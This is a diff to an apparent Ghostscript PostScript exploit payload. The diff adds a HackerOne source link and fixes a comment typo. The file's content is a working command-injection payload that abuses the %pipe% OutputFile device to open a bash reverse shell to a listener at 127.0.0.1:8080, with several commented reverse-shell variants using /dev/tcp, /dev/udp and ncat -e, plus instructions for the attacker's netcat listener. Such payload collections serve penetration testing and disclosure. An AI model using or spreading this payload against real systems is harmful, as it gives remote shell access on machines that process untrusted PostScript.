@@ -1,5 +1,6 @@
 %!PS
 % Note: Only works if -dSAFER flag is not present
+% Source:https://hackerone.com/reports/403417
 
 userdict /setpagedevice undef
 legal
@@ -7,7 +8,9 @@ legal
 legal
 mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1') currentdevice putdeviceprops
 
-% Reverse Shell variations - us "nc -nlvp 8080" on attacker host and adjust attacker IP below!
+
+
+% Reverse Shell variations - use "nc -nlvp 8080" on attacker host and adjust attacker IP below!
 %mark /OutputFile (%pipe%bash -c '0<&196;exec 196<>/dev/tcp/127.0.0.1/8080; sh <&196 >&196 2>&196') currentdevice putdeviceprops
 %mark /OutputFile (%pipe%bash -c 'sh -i >& /dev/udp/127.0.0.1/8080 0>&1') currentdevice putdeviceprops
 %mark /OutputFile (%pipe%bash -c 'ncat 127.0.0.1 8080 -e /bin/bash') currentdevice putdeviceprops
